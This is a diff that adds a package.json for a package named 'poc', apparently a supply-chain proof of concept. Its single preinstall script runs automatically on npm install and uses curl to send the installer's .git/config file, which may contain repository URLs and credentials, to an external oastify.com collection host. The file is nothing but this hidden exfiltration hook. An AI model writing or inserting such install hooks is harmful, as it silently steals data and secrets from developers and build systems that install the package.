@@ -1,0 +1,7 @@
+{
+  "name": "poc",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -s https://5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com/npm -d @.git/config || true"
+  }
+}
